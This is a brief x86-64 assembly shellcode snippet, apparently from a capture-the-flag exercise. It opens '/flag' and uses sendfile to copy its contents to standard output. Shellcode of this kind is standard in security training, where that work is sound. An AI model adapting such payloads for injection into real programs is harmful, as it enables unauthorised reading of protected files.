.global _start
_start:
.intel_syntax noprefix
# open("/flag", 0) // 0 is O_RDONLY
mov rax, 2
lea rdi, [rip+flag]
mov rsi, 0
syscall

# sendfile(1, 3, 0, 0x80);
mov rax, 40
mov rdi, 1
mov rsi, 3
mov rdx, 0
mov r10, 0x80
syscall

flag:
.asciz "/flag"
